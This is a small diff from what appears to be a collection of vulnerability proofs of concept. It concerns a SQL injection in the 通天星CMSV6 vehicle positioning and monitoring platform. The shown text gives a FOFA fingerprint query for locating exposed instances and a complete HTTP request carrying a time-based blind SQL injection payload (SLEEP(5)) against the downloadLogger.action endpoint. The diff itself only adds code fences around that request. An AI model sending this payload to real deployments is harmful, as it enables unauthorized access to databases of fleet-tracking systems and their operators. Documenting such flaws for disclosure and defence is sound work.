@@ -74,12 +74,15 @@ FOFA：body="/808gps/"
 
 POC/EXP：
 
+```http
 GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
+```
+
 
 ![image-20240723100459976](./.resource/通天星CMSV6车载定位监控平台disableSQL注入漏洞/media/image-20240723100459976.png)
 
